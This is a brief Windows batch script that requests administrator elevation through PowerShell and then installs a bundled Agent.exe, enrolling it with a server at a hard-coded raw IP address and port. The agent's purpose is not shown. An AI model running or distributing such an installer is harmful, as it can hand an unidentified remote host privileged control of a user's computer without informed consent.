@echo off
REM Check if running as administrator
fltmc >nul 2>&1 || (
    echo Requesting administrator privileges...
    goto :runasadmin
)

REM Original script content
cd /d "%~dp0\.\agent"
Agent.exe -install -server http://47.113.219.65:6600
goto :eof

:runasadmin
REM Rerun script as administrator
powershell -Command "Start-Process cmd -ArgumentList '/c ""%~f0""' -Verb RunAs"
exit /b